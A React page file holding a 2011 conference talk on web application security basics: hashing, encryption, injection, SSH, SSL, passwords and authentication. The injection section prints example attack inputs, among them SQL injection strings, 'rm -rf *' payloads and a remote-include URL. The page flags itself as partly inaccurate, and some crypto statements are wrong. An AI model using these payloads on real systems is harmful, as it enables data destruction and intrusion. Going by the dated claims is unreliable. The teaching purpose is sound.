import { Link } from "gatsby";
import * as React from "react";

import Layout, { writingsSidebar } from "../../layouts";

const WebApplicationSecurityFundamentals: React.FC = () => (
  <Layout
    sidebar={writingsSidebar}
    title="Web Application Security Fundamentals"
  >
    <div style={{ textAlign: "center" }}>
      Given as a{" "}
      <a href="http://2011.drupalcampchicago.org/sessions/web-application-security-fundamentals">
        talk
      </a>{" "}
      at{" "}
      <a href="http://2011.drupalcampchicago.org/">Drupal Camp Chicago 2011</a>.
      Note that this contains some inaccurate information; see the{" "}
      <Link to="/writings/cryptography-and-security-coders/">
        updated version
      </Link>{" "}
      for more.
    </div>
    <h2>Cryptography</h2>
    <p>
      Cryptography is actually a pretty simple concept. Encrypting and
      cryptographic hashing simply means that we take an original &ldquo;plain
      text&rdquo; and convert it into something which is more a bit more
      difficult to understand.
    </p>
    <p>
      Let&rsquo;s consider an example. Think of the algorithm (ROT2) that takes
      every letter in the plain text and increments (lexicographically) each
      letter twice, wrapping on &lsquo;z&rsquo;. This algorithm would turn the
      plain text would turn &lsquo;how are you doing?&rsquo; into the cypher
      text &lsquo;jqy ctg aqw fqkpi?&rsquo;. This is an example of encryption.
    </p>
    <p>
      Encryption isn&rsquo;t the only topic within cryptography, though.
      Consider the algorithm which counts the number of vowels in the plain
      text. This would turn &lsquo;how are you doing?&rsquo; into
      &lsquo;a1e0i1o3u1&rsquo;. This is an example of a cryptographic hash,
      another form of cryptography.
    </p>
    <p>
      The first form of cryptography, encryption, is a two-way algorithm. This
      means that for every &lsquo;encrypt&rsquo; operation, there is an inverse
      &lsquo;decrypt&rsquo; operation. In our previous example, ROT2 can be
      decrypted with ROT-2, i.e. decrementing each letter in the cypher text
      twice to get the original plain text.
    </p>
    <p>
      The second form of cryptography, cryptographic hashes, is a one-way
      algorithm. These algorithms should be &ldquo;lossy&rdquo; meaning that
      some information is lost during the hashing operation. One-way algorithms
      should have no inverse. In our example, you can see that it&rsquo;d be
      very difficult to go back from &lsquo;a1e0u1o3u1&rsquo; to our plain text,
      &lsquo;how are you doing?&rsquo;
    </p>
    <p>
      Let&rsquo;s not briefly consider when to use encryption over hashing and
      vis versa. Hashes are most often used for passwords and credit card
      numbers. They should be used whenever there is a need to verify some
      information without needing to store that information. Encryption should
      be used for pretty much everything else. In particular, encryption should
      be used for any identifying or personal information.
    </p>
    <p>
      You might now ask, why should I be encrypting data? There are a few good
      reasons to encrypt data, but the most obvious is that your database{" "}
      <em>will</em> get hacked at some point. This might be through an intruder,
      it might be a disgruntled employee, it might be long after your company
      goes under, but at some point, the information in your database will be
      seen by someone you don&rsquo;t want to see it. In these situations, you
      want the raw database to be worthless to your attackers. You might also
      want to hide data from yourself (you don&rsquo;t really need to know user
      passwords,) or limit access to specific employees/services (think of a
      shared database, where encryption keys determine access.) You might also
      use cryptography to verify integrity of documents (such as through GPG
      signatures in emails.)
    </p>
    <p>
      The final quick word in this overview is to emphasize that you should{" "}
      <em>never</em> roll your own cryptographic solutions (e.g. ROT2,
      VowelCount above.) Use the algorithms that have been vetted by security
      professionals. These bright men and women have thought through thousands
      of situations and exceptions which might break the crypto algorithms. The
      rest of this document will cover a great deal of theory that underlies
      modern security systems; it&rsquo;s important that you keep the theory in
      mind, but use someone else&rsquo; implementation.
    </p>
    <h2>Hashing Theory and Best Practices</h2>
    <p>
      Quickly reviewing, remember that hashes are the one-way algorithms that
      take plain text and turn it in to mush that cannot be converted back. It
      is most often used for passwords and credit card info. Let&rsquo;s talk
      about some hashing theory and end with best practices.
    </p>
    <p>
      We start with salting, which is effectively padding your plain text with
      predictable noise. As a quick example, the password &ldquo;how are you
      doing?&rdquo; might be expanded to
      &ldquo;skjdwejkh9328y9r8sdkjfsdkjhgasdhow are you
      doing?f32hiu32y498esdh3298ashdq0ieoyrzckjg&rdquo;. Salting has the benefit
      of preventing a &ldquo;rainbow table attack.&rdquo; Almost any algorithm
      that you use for hashing (e.g. md5, sha1, sha256) is publicly known, so
      mischievous hackers have gone through and generated the cyphered text
      corresponding to the plain text of billions of passwords. They hash
      &lsquo;a&rsquo; then &lsquo;b&rsquo; then &lsquo;c&rsquo; . . . then
      &lsquo;aa&rsquo;, &lsquo;ab&rsquo;, etc. until they have gigabytes and
      gigabytes of mappings from a cyphered hash back to the original password;
      these databases are called rainbow tables. Salting your passwords makes
      rainbow tables ineffective.
    </p>
    <p>
      You may notice that the salt I added was concatenated to both the
      beginning and end of the plain text. This was not arbitrary, but it is
      also not the best practice. Salt should not be solely added to the
      beginning due to the block-chaining nature of most hashing algorithms.
      Salt appended to the plain text is better, and salt on both ends is better
      still, but there are theoretical attacks on these strategies. Instead,
      there exists HMAC, a system which intelligently mixes salts with the clear
      text in a manner that does not have similar vulnerabilities.
    </p>
    <p>
      That&rsquo;s great, but how do you come up with a salt? We could use a
      constant string for each entry, which is significantly better than using
      no salt, but suffers from a pretty obvious flaw. A rainbow table using
      that salt can be generated just as easily as a rainbow table with no salt.
      Instead, we want something more dynamic, so we might consider storing a
      random &ldquo;nonce&rdquo; (i.e. one-use string) with each hash. In this
      situation, it would require one rainbow table per user (or row) to
      determine the original password. An even better solution is to mix both
      this nonce and a derivable piece (e.g. the user&rsquo;s id or email
      address) so that evening having both the nonce and the cypher text would
      not produce a rainbow table capable of retrieving the original password.
      Many modern algorithms even store their salt in encoded form in their
      output cypher text, so there&rsquo;s no need for another column in your
      database.
    </p>
    <p>
      Unfortunately, we need more than just salts, as anyone could brute force
      our authentication mechanism to guess user passwords. If we are using md5,
      sha1, or many other hashing functions, an attacker could test dozens of
      passwords a second (hundreds if you have good hardware.) Instead,
      you&rsquo;ll want to slow the log-in procedure down by using a technique
      known as &ldquo;key stretching.&rdquo; This technique usually simply
      hashes the previous iteration&rsquo;s hash hundreds or thousands of times
      (&ldquo;rounds&rdquo;) which makes testing passwords sequentially a slow
      trudge.
    </p>
    <p>
      Time isn&rsquo;t the only resource one should consider, however. An
      intrepid hacker will throw attacks at your in parallel, which will
      ultimately be limited by your hardware capacity, but still diminishes the
      security of your login. Further, if your database and application are
      compromised, such a hacker would be able to spin up a seemingly infinite
      number of parallel processes to try to crack a user&rsquo;s password.
      Here, a memory intensive function is a good option; it effectively
      requires both computer and memory resources, thereby raising the bar
      beyond the time constraint.
    </p>
    <p>
      Now that we&rsquo;ve covered a bit of theory, what does this mean
      practically? The bright minds in security have your back here; using
      systems like bcrypt and scrypt (and in the PHP world, phpass) will
      generally alleviate the problem for you. It&rsquo;s important to note the
      configuration parameters and comparisons between these tools, however.
      Having a large salt size helps defend against rainbow tables, and
      algorithms that require many &ldquo;rounds&rdquo; and greater memory
      consumption defend against brute force attacks
    </p>
    <p>
      So you now know how you should be encrypting, but unfortunately you have a
      big database of unsalted, md5ed passwords. What do you do? Luckily,
      chaining hashing algorithms generally takes on the security of the best
      algorithm, so if you have an unsalted md5 right now, you can mass update
      your database by bcrypting all of those entries. When a user next signs
      in, you would first md5 their password, then bcrypt it before testing for
      hash equality.
    </p>
    <h2>Platform Security</h2>
    <p>
      If your web application is developed with Play, your stack likely includes
      Play, the JVM, a database, a servlet container, a file system, an
      operating system, etc. If you are running a scripting language, you most
      likely have something like Drupal, PHP, a database, a web server, a file
      system, an operating system, email systems, etc. Ultimately, any one of
      these various applications and libraries could introduce a security
      vulnerability which might compromise your app. As such, it&rsquo;s pretty
      critical that all of these libraries be kept up to date.
    </p>
    <p>
      Note also that each of these segments of your platform stack likely has
      its own configuration. Do review these configurations, as
      misconfigurations are #6 on the OWASP top 10 vulnerabilities. Of course,
      you probably won&rsquo;t be able to go super deep into the lower level
      tools (what inode <em>is</em> this file?), but you should particularly pay
      attention to the configurations closest to your app (your framework, web
      server, database, and VM.) Learn what the Apache directives mean and be
      sure you aren&rsquo;t listing all files within your /var/www directory
      when a file isn&rsquo;t found.
    </p>
    <p>
      Knowing what configuration settings you have isn&rsquo;t enough, though.
      As these files tend to contain sensitive information (such as database
      passwords, encryption keys, etc.,) you should try to limit accessibility
      to only those users that need to know. Further, try to keep a hash of the
      relevant configuration files and verify that they aren&rsquo;t changing.
      An attacker who gains access to your system is likely to change these
      configurations to make his/her job easier, and this is a clear sign of a
      break-in.
    </p>
    <p>
      Be aware of your firewall settings and know which ports are open.
      Arbitrary IP addresses should only have access to HTTP and HTTPS. Use
      iptables or other firewall tools to limit access to memcache, your
      database, ssh, and other services to only the IPs that matter. If you need
      to ssh in from arbitrary locations, use a non-default port. If you are
      unfamiliar which ports are open, use the nmap tool.
    </p>
    <p>
      We&rsquo;ll close this section with a bit of a bias. In my humble opinion,
      if you want the possibility of having a secure system, you really ought to
      be using Linux or BSD. The Unix user/group permission system is powerful
      yet simple, allowing you to easily limit access by user/application.
      Unfortunately, Windows server and Windows desktop share a great deal of
      code, which means that many of those desktop viruses and malware that make
      headlines can affect your <em>server</em> in addition to any targeted
      attacks. Finally, Linux and BSD distros tend to have very sophisticated
      package managers and repositories. These packages tend to have relatively
      sane defaults and make keeping up to date simple. Of course, this means
      you should try to get the other elements in your stack from these
      repositories rather than compiling them yourself.
    </p>
    <h2>Encryption Theory and Best Practices</h2>
    <p>
      At the top of this paper, a encryption was introduced via the ROT-2
      algorithm. It&rsquo;s important that we take a note and clarify that no
      modern encryption algorithm relies on a secret algorithm. In fact, in
      general, the more widely known an algorithm the better, as this would
      indicate that it has been publicly reviewed by security researchers.
      Instead of the algorithm being a secret, modern encryption relies on a
      secret &ldquo;key,&rdquo; which can be thought of as a parameter to the
      algorithm. Consider our ROT-2 example; here ROT (i.e. rotate) may be
      thought of as the encryption algorithm and 2 the key. The number 7
      (rotating each letter 7 times) would be an altogether different key.
    </p>
    <p>
      It should be clear then, that your most important information is now your
      key. In many ways, this key is like a password. Just as with a password,
      the longer the key the better. This key length is generally what analysts
      are referring to when they say 128-,256-,512-,etc.-bit encryption. Unlike
      a password, these keys must be generated randomly and are therefore
      unlikely to be memorizable, particularly given their length. The
      implication, then, is that your keys will need to be stored somewhere.
    </p>
    <p>
      We&rsquo;ve now pushed off security to the question of where the keys are
      stored. Imagine if the keys were stored <em>in</em> the database. In this
      situation, an attacker who managed to steal your database would have both
      the encrypted data <em>and</em> the keys needed to decrypt it, resulting
      in almost no benefit from encryption. Instead, you should aim to keep your
      keys as far away from your data as possible. Consider using a database
      server which contains all of the encrypted data, but contains no keys. The
      keys could be provided by the service accessing the database, or even the
      client-side.
    </p>
    <p>
      A related goal is that of key granularity. By this I mean the use of
      different keys for different data. You could have one key for your user
      table, or one key for your user.first name column, or even a unique key
      per row. In any case, the more granular your keys, the more you can
      control access over said data by limiting access to the keys. In this
      setup, you would provide keys only to the services/users who needed them.
    </p>
    <p>
      One rule of thumb is to never share keys between your development and
      production environment. Ideally, your developers would not have access to
      the production keys. Limiting access means adding firewalls, and the more
      firewalls you have the less likely you will have a catastrophic failure.
      In this vein, be sure that when a key is accidentally released (e.g.
      through an email, an employee leaving, etc.,) you generate a new key and
      migrate the data from the old key to the new.
    </p>
    <p>
      Let&rsquo;s briefly switch back to theory before we end this section. So
      far, I&rsquo;ve largely described <em>symmetric</em> key algorithms. These
      algorithms use the same key to encrypt as decrypt. They tend to be very
      fast (with many processors now coming with hardware to make
      encryption/decryption even faster,) but require that a secret key be
      transmitted in some way between the encryption site and the decryption
      site. If these are all servers you own, this shouldn&rsquo;t be a problem,
      but it might not always be this easy (particularly when working with
      another party.)
    </p>
    <p>
      An alternative, known as an asymmetric key (or key pair or public key)
      encryption offers a different set of trade offs. These algorithms generate{" "}
      <em>two</em> keys, one public and one private such that each key can only
      decrypt a message encrypted with the other. Your public key is used to
      decrypt data sent to you (which you then decrypt with your private key)
      and your private key is used to encrypt data you send (which can be
      decrypted by anyone with your public key.) Asymmetric keys have the upside
      that they prove authenticity (as only the private key owner could send a
      message decryptable via the public key) and confidentiality (as only the
      private key of the receiver can be used to decrypt a message encrypted
      with the receiver&rsquo;s public key.) A single key pair could also be
      used to limit read access to certain users and write access to others.
      Unfortunately, asymmetric key algorithms are much slower than symmetric
      key algorithms. Often documents send via &ldquo;public key&rdquo; encrypt
      the document via a symmetric key and then encrypt that key with an
      asymmetric algorithm.
    </p>
    <h2>Injection</h2>
    <p>
      Injection is currently the number one security risk in the OWASP top ten.
      An injection attack occurs when an attacker adds (&ldquo;injects&rdquo;)
      new code into your application. It is most commonly associated with a
      subset called an SQL injection, so we will consider that subset first.
    </p>
    <p>
      SQL injection is a relatively wide-known vulnerability for web
      applications which do not properly sanitize the queries they send to their
      database. Consider the PHP snippet,
    </p>
    <p>
      <code>
        &ldquo;SELECT * FROM user where username = &lsquo;&rdquo; .
        $_POST[&lsquo;username&rsquo;] . &ldquo;&rsquo;&rdquo;
      </code>
    </p>
    <p>
      The goal is to retrieve all information about the user whose user name
      matches the POSTed input field, and if the attacker plays nice and only
      sends user names, there will be no problem. Consider if the attacker sends
      the input &ldquo;&rsquo; OR &lsquo;1&rsquo; = &lsquo;1&rdquo;. The query
      now checks for a user whose username matches &lsquo;&rsquo; OR any user
      when &lsquo;1&rsquo; = &lsquo;1&rsquo;, i.e. all users. Consider the input
      &ldquo;&rsquo;; DELETE FROM user WHERE &lsquo;&rsquo; = &lsquo;&rdquo;.
      Now, the database attempts to find all users with the username
      &lsquo;&rsquo;. When that query ends, the database proceeds to delete all
      users. Not quite what you expected?
    </p>
    <p>
      The problem here is the use of string concatenation when generating the
      SQL queries. Because the user input is inserted directly into the query
      before being sanitized (read, escaped), there are no guarantees what query
      will be executed. One solution to this problem is to use prepared queries
      or placeholders. Now your query becomes
    </p>
    <p>
      <code>&ldquo;SELECT * FROM user WHERE username = ?&rdquo;</code>
    </p>
    <p>
      and $_POST[&lsquo;username&rsquo;] is provided as a parameter. It&rsquo;s
      now the duty of your database abstraction layer to determine the best way
      to escape the input (whether it be a string, an integer, etc.).
    </p>
    <p>
      Another option would be to rely on a query framework. Object-relational
      mappers and the like are usually built to allow a querying mechanism which
      will hide the error-prone SQL from you. With them, you&rsquo;d see
      something like
    </p>
    <p>
      <code>
        users.filterEq(&ldquo;username&rdquo;, $_POST[&lsquo;username&rsquo;])
      </code>
    </p>
    <p>
      Now, you&rsquo;ve probably all seen that example, but let&rsquo;s consider
      the following:
    </p>
    <p>
      <code>&ldquo;SELECT * FROM node WHERE nid = &rdquo; . urlSegment(2)</code>
    </p>
    <p>
      Presumably, this fragment grabs the node whose id matches the third
      segment of the url (e.g. 25 in /node/25). Unfortunately, this is no better
      than the previous example, as the url is provided by the user. One could
      encode the same injection attacks via a well-encoded url as they could
      through a text-box. As a security-conscious web app developer, you should
      be weary of <em>any</em> input a user provides.
    </p>
    <p>
      What type of input does a user provide? Obviously, the POST and GET
      parameters (typically coming from forms) are user input. This includes any
      hidden fields that you have generated or any drop-down menus which you
      have populated; users can easily tamper with these hidden fields and
      submit selections which were not originally available, so do not assume
      that they are limited. As we just mentioned a moment ago, the entire url
      should be considered user input. This includes the domain name, as a user
      could easily modify their hosts file to redirect incorrectly. Any cookies
      that a user provides should also be suspect, even the session id and
      expires information. If you happen to use the user agent, referrer field,
      or anything else in the header, you should also recognize that these
      fields are provided by the users and could easily be forged.
    </p>
    <p>
      SQL isn&rsquo;t the only style of injection attack, however. Let&rsquo;s
      next consider a script or dynamic injection. These attacks are most
      commonly found in a dynamic language, though there is the potential to
      create similar problems in statically typed languages. The crux of the
      problem is that code which has been provided by the user is executed
      dynamically. Many languages have the ability to interpret code
      dynamically, such as with the PHP &ldquo;eval&rdquo; method:
    </p>
    <p>
      <code>eval(&lsquo;$myvar = &rsquo; . $_GET[&lsquo;myvar&rsquo;])</code>
    </p>
    <p>
      Here, a mischievous user could provide any value for myvar, including
      &ldquo;1; exec(&lsquo;rm -rf *&rsquo;);&rdquo; which has the potential to
      delete your entire webapp. Dynamic variable names provide a slightly
      different vulnerability. Consider:
    </p>
    <ul>
      <li>$is_admin = false;</li>
      <li>$search = &lsquo;&rsquo;;</li>
      <li>{"foreach ($_GET as $key => $value) { $$key = $value; }"}</li>
    </ul>
    <p>
      This seems fine enough, particularly if there are a large number of GET
      parameters you wish to turn in to variables. Unfortunately, imagine the
      query string ?search=mysearch&amp;is_admin=1.
    </p>
    <p>
      Dynamically called functions have a similar fate. You might think
      it&rsquo;s a good idea to have a user&rsquo;s selection determine which
      method gets called, but what if the user forces a harmful function name;
      this is a more frightening idea when you combine in with the injection
      attacks described above. If your architecture relies on this mechanism, be
      sure to use a white-list of acceptable functions.
    </p>
    <p>
      A final concern for dynamic languages which particularly applies to PHP is
      a file-inclusion attack. Consider
    </p>
    <ul>
      <li>$color = $_GET[&lsquo;color&rsquo;] ?: &lsquo;blue&rsquo;;</li>
      <li>include($color . &ldquo;.php&rdquo;);</li>
    </ul>
    <p>
      This should include the php file associated with the user-selected color.
      Unfortunately, a malicious user might realize your blunder and use the
      query ?color=http://somewherebad.com/aweful, which would cause your web
      server to download the aweful.php file and execute it. For this reason,
      include files should not be dynamically retrieved unless you are certain
      the input is safe.
    </p>
    <p>
      Let&rsquo;s also consider shell injections. This may occur if your
      application ever runs an external application with input provided by the
      user.
    </p>
    <p>
      <code>
        exec(&ldquo;xmlstarlet &rdquo; . $_GET[&lsquo;filename&rsquo;])
      </code>
    </p>
    <p>
      Unfortunately, if the user provides the filename &ldquo;; rm -rf *&rdquo;
      he/she is once again deleting your app. The attacker could also pass the
      filename &ldquo;`rm -rf *`&rdquo; which would perform the same action. Now
      imagine if an attacker used the filename &ldquo;somefile.xml; echo
      &ldquo;replaced&rdquo; &gt;
      /home/yourusername/.ssh/authorized_keys&rdquo;. Now he/she could ssh into
      your box, a much more serious offense.
    </p>
    <p>
      Cross Site Scripting is a large enough topic that I&rsquo;ve given it its
      own section, but XSS is technically a form of injection.
    </p>
    <p>
      Never attempt to manually escape user input with regular expressions - you
      will miss something. Relying on the functions built into your libraries is
      significantly better, but again, you really shouldn&rsquo;t depend on
      them. Bugs are routinely found in these libraries. Instead, you should try
      your best to architect around the use of dynamically executed code
      wherever possible.
    </p>
    <h2>Remote Access</h2>
    <p>
      Before I go to deep into locking down your system, I want to spend a brief
      moment on a tangent. From a security perspective, shared hosting is quite
      bad. Shared hosting usually consists of a single physical box with a
      single Linux installation, where each user gets his/her own home
      directory. Though I love Linux (a topic which will be expanded in a
      moment,) there is no way to guarantee that there is no information leakage
      between customers. Almost all providers will block users from the ability
      to see each others&rsquo; files, but misconfigurations and routine
      maintenance make this less than ideal. Further, as you are all running on
      the same operating system, it would be relatively easy for a malicious
      user to dump main memory and find information about your application.
      Virtual hosting (such as Rackspace or EC2) is better in this regard, but
      there are known side-channel attacks.
    </p>
    <p>
      Speaking of bad things, FTP should be avoided at all costs. All messages
      are sent over plain text; this includes your username, password, and the
      files which are uploaded and downloaded. FTP should therefore never be
      used for anything of value, particularly when its functionality is easily
      replicable with more secure technologies. FTPS, FTP over SSL, is
      significantly better, but I much prefer using SFTP, FTP over an SSH
      channel. This technique is particularly useful since SSH will likely be
      your most common mode of communication with your servers. SFTP is just as
      easy to use as FTP, and almost all GUI FTP programs can also handle SFTP
      connections.
    </p>
    <p>
      As SFTP runs over SSH, you will likely use a username and password to
      connect. You could also quickly generate a public/private key pair which
      can serve as authentication. In this scenario, you just copy the public
      key to ~/.ssh/authorized_keys on the remote server and keep the private
      key on the local server in your ~/.ssh directory. This allows you to log
      in from a particular computer without needing a password, though you could
      add a password to the usage of the private key if you wanted additional
      security. Creating a new public/private key pair is easy, just run the
      command
    </p>
    <p>
      <code>ssh-keygen -t rsa</code>
    </p>
    <p>
      Ideally everyone who has access to your SFTP server would have a different
      username, but if that is not the case, be sure that everyone has a
      different key. This allows you to quickly remove someone&rsquo;s access by
      simply removing their key from the authorized_keys file.
    </p>
    <p>
      SSH (and by extension SFTP) has some very valuable configurations that you
      should consider. For example, the SSH daemon can be configured to restrict
      access to certain IPs. Another configuration, which allows the root user
      to log in over SSH should be turned off. There&rsquo;s no reason you
      should be logging in to your server as root remotely; instead, log in as a
      user with sudo privileges. I generally also change the default sshd port;
      this is security through obscurity, but it does significantly drop the
      number of malicious login attempts. Finally, sftp itself can be configured
      to use a &ldquo;jail&rdquo; to limit what files can be seen by sftp users.
    </p>
    <h2>SSL</h2>
    <p>
      Consider what happens when we go to a website such as
      http://www.google.com and search for a term. As this connection is over
      HTTP, all information sent between me and the server, including my search
      request and Google&rsquo;s response, are sent as clear text. This means
      that if I&rsquo;m on open wireless network, anyone around me can see those
      messages. Further, any of the nodes in between me and Google also will
      have access to that data.
    </p>
    <p>
      This can be good in certain situations, as nodes along the way may be able
      to cache the data. For a while, large ISPs would cache the traffic of
      their customers so that the front page of CNN was usually served through
      your ISP. This has the benefit that the information gets to you faster,
      and that your ISP doesn&rsquo;t need to pay for the traffic it is sending
      to CNN.
    </p>
    <p>
      The downside, of course, is that any confidential information (login
      credentials, credit cards, etc.) are sent in the clear. The solution to
      this problem is HTTPS, HTTP over the Secure Sockets Layer (SSL.) You will
      want to think of this as an encrypted tunnel between you and the server
      such that no one outside of your conversation can see it. For a time,
      using SSL implied a small performance hit, as both sides would need to
      encrypt and decrypt data. Though this hit was small, it has been removed
      almost completely by the fact that modern processors have symmetric key
      encryption built in.
    </p>
    <p>
      Until only recently, websites would require SSL only for authenticating
      and performing credit card transactions. For example, amazon would require
      SSL when you signed in, but would drop you back into an HTTP connection
      while you were browsing. This proved to be problematic as it required
      users be conscious of whether or not their connection was sent over http
      or https.
    </p>
    <p>
      There also arose the problem of session hijacking. You see, when
      you&rsquo;ve logged in to a website, that site will give you a session
      token which must be presented on each subsequent page view. If you log in
      over SSL, but the rest of your session is over HTTP, the session token
      will be visible by the third parties I mentioned above. This came to a
      boil with FireSheep, a Firefox plugin that would sniff the network for
      Facebook session ids. It would then literally show you pictures of the
      users who were logged in around you and if you clicked on one, you would
      begin using his/her session token, and therefore be logged in as that
      user. As a result, many websites, including Twitter, Facebook, and Google
      are moving to an HTTPS-only system.
    </p>
    <p>
      In general, I&rsquo;d recommend the use of HTTPS for your entire website,
      if possible. If you are following this route, be sure to disable HTTP
      access to your website through your web server configuration. You can
      easily setup nginx or a similar light-weight solution to redirect all port
      80 (HTTP) traffic to 443 (HTTPS.) If for whatever reason, you need to mix
      HTTP and HTTPS pages, use &ldquo;secure cookies.&rdquo; These are HTTP
      cookies with the &ldquo;secure&rdquo; parameter; most browsers will
      respect this parameter and refrain from sending the cookie over HTTP.
    </p>
    <p>
      I&rsquo;ll close by noting a dark side to SSL. Right now, though anyone
      can issue their own SSL certificate, browser vendors will only gladly
      accept those certificates which are &ldquo;signed&rdquo; by a
      &ldquo;certificate authority&rdquo; or CA. These CAs are a bit of a cabal;
      to have your certificate signed, you must pay one of these authorities to
      &ldquo;verify&rdquo; that you do, in fact, own the domain. This is
      generally as simple as them sending an automated email to your domain. To
      get a <em>green</em> certificate, you must jump through a few more hoops
      and spend quite a bit more. Verisign, perhaps the most recognized
      certificate authority, sells certificates for a few hundred dollars a
      year. Ideally we&rsquo;d have an alternate system, and while some have
      been proposed, none have gained enough backing that you can ignore the
      present racket. Instead, I&rsquo;d suggest using a cheaper SSL
      alternative, like RapidSSL. This won&rsquo;t decrease your security, but
      will decrease the hit on your wallet.
    </p>
    <h2>Passwords</h2>
    <p>
      If you think about it for a few moments, you might realize that almost all
      of the security we&rsquo;re covering here ultimately boils down to a
      handful of passwords. These could be your site administrator password,
      your database password, your sudo password, your bios password, or any
      other number of critical strings. As a security-minded person, you should
      become aware of what makes a good password good and know the factors well
      enough to teach your users.
    </p>
    <p>
      There are two common attacks on user passwords; let&rsquo;s begin with
      dictionary attacks. These dictionaries are not from Oxford; they do not
      begin with aardvark nor end with zyzzyva. There are instead big lists of
      the most common passwords. Let&rsquo;s take a look at{" "}
      <a
        href="http://blog.jimmyr.com/Password_analysis_of_databases_that_were_hacked_28_2009.php"
        rel="noopener noreferrer"
        target="_blank"
      >
        this list
      </a>
      , a collection of the most common passwords used on MySpace, Singles.org,
      and another site whose passwords were leaked in the mid 00&rsquo;s. Do you
      see any familiar passwords? If the passwords of you or any of the users
      with authority are on this list, or <em>any</em> top hundred, thousand,
      etc. most common passwords lists, you need to change them immediately.
      These passwords are the passwords which make up the dictionary; they will
      be the first passwords tried by a hacker. I recommend creating a blacklist
      of passwords and anytime you or your authoritative users create a new
      password, check that it is not on the blacklist.
    </p>
    <p>
      The second common attack is what is known as a &ldquo;brute force&rdquo;
      attack. These consist of an attacker walking through all strings in
      lexicographical order, first trying &ldquo;a&rdquo;, then &ldquo;b&rdquo;,
      and getting to &ldquo;aa&rdquo;, &ldquo;ab&rdquo;, etc. By definition,
      these attempts will eventually succeed, but how can you make them less
      effective? To consider some server-side techniques (such as key
      stretching,) take a look at the Hashing Best Practices section.
    </p>
    <p>
      To create a strong password, use the full character set. Guessing all
      combinations of lower-case letters of length 8 is much faster than
      guessing an 8-character string whose characters may be in either case, may
      include numbers, may include symbols, and may include unicode characters.
      Another helpful solution is to make the passwords very long -- the longer
      a password is, the more time it will take to guess if guessing in
      lexicographical order. Routinely resetting your password (or having the
      server reset it) provides a good mechanism to reset the efforts of hackers
      attempting to break into your site. If your password gets reset, there is
      no way for the attacker to know if their algorithm has already passed your
      new password. Of course, this should go without saying, but be sure to use{" "}
      <em>different</em> passwords so that if one were compromised, you would
      continue to be safe with the others.
    </p>
    <p>
      Note that none of this means your password should be hard to remember.
      Perhaps you have a small password which is easy to remember and you have
      some &ldquo;trick&rdquo; to expanding that password and making it include
      more characters. This could include reversing the password, rotating the
      alphabet, repeating the vowels, ending with the password&rsquo;s length,
      or any number of other tricks which would be <em>unique to you</em>.
    </p>
    <p>
      Of course the best password is no password; to find out about that
      strategy, take a look at the
    </p>
    <h2>Authentication</h2>
    <p>
      Authentication is all about identity, specifically about verifying
      identity. You might think of a typical username and password login screen.
      Here the identity is defined by the username field and the password serves
      as proof of that identity. Presumably, only the person who owned the
      identity would be aware of the password, so by presenting the password,
      they are providing evidence of ownership.
    </p>
    <p>
      Usernames and passwords aren&rsquo;t the only form of authentication,
      however. Authentication falls into three basic categories of proof. There
      is what which you have, such as a passport, a debit card, or a key fob.
      The second category is that which you know, like your password, your
      middle name, or your date of birth. Finally, there is that which is
      inherent to you. This is a bit difficult to explain, but these are the
      factors which are yours purely by the fact that you are yourself; they
      tend to be difficult to lose and difficult to give to others. They include
      things like your retina, a fingerprint, and your DNA. This last category
      is particularly difficult to verify remotely (as is the case with web
      applications) so we tend to focus on the first two.
    </p>
    <p>
      If you&rsquo;ve heard of two-factor of multi-factor authentication, it
      specifically refers to any authentication mechanism which requires
      evidence from two or more categories. For example, Google provides two
      factor authentication where they send a message to your phone (that which
      you have) which you must enter in addition to your password (that which
      you know.) Multi-factor authentication is a very good idea and is used for
      the most sensitive of data. For example, ATM transactions require your
      card (something you have) and your pin (something you know.) The more
      forms of evidence someone can provide, the more assured you can be that
      they are who they claim to be. It&rsquo;s best not to get carried away,
      but surely you can imagine situations in which a password alone is not the
      best option.
    </p>
    <p>
      Going back a bit, what alternatives do we have to the traditional
      username/password schemes? Let&rsquo;s consider what happens when a user
      logs in. The server generates a random session token which it then
      provides to your browser as a cookie; in all subsequent correspondences
      during this session, the browser will provide the session token back to
      the server. Effectively, the this interaction has converted that which you
      know (your password) into that which you have (your token.) Note that
      it&rsquo;s essential that that token be randomly generated and be
      relatively long to prevent any others from guessing the token during its
      lifetime. SSH keys fit a similar role, but they do not expire. To account
      for this, most SSH keys are very, very long.
    </p>
    <p>
      Both of these mechanisms are still single-factor authentication. We can
      modify the SSH scenario so that use of the private SSH key requires a
      password to be manually entered. For a website, we could limit logins by
      IP address, which would add additional evidence of identity. Limiting
      access by IP might be seen as something owned or perhaps inherent to the
      user; in either event, it&rsquo;s relatively transparent to the user.
      Perhaps a session cookie is enough verification when sent from an expected
      IP address, but a password is required when send from an unexpected IP.
    </p>
    <p>
      An alternative to handling the authentication purely on your side is to
      effectively offload this work onto others. Single sign-on systems, such as
      oauth, openid, and facebook connect provide a relatively sane workflow for
      signing in users. Though the specifics vary with each system, the basic
      workflow is pretty similar. When a user wishes to login via a third party,
      your server needs to generate a unique identifier for that request. The
      identifier is then provided to the browser, which then allows the user to
      log in to the third party. During the login process, the user provides
      this identifier to the third party. At the end of the login process, the
      third party either sends a message to your web service or redirects the
      user to your website. In either case, your unique identifier is repeated
      and a new token is provided. This token can then be used by your service
      to get some information about the user and to verify that the token
      originated from the right third party.
    </p>
    <p>
      That may sound like a lot of work (in practice, it&rsquo;s not too
      difficult), but allowing users to sign up through a third party makes both
      business and security sense. From the security perspective, allowing users
      to sign in through a third party limits your liability with regards to
      their login credentials; these services will also generally have a better
      security system than can be implemented by smaller groups of developers.
    </p>
    <p>
      One note on providing multiple methods for authentication. Be sure to
      provide a mechanism for users to &ldquo;verify&rdquo; authentication
      methods and to remove them as they feel fit. I wouldn&rsquo;t trust a
      third party with the ability to log in to my bank account, for example, so
      I&rsquo;d want to remove any authentication mechanisms that might lead to
      that. Similarly, allow users to revoke authentication privileges as
      needed. I may have just ended by ISP contract and would prefer my old IP
      have special status.
    </p>
  </Layout>
);
export default WebApplicationSecurityFundamentals;
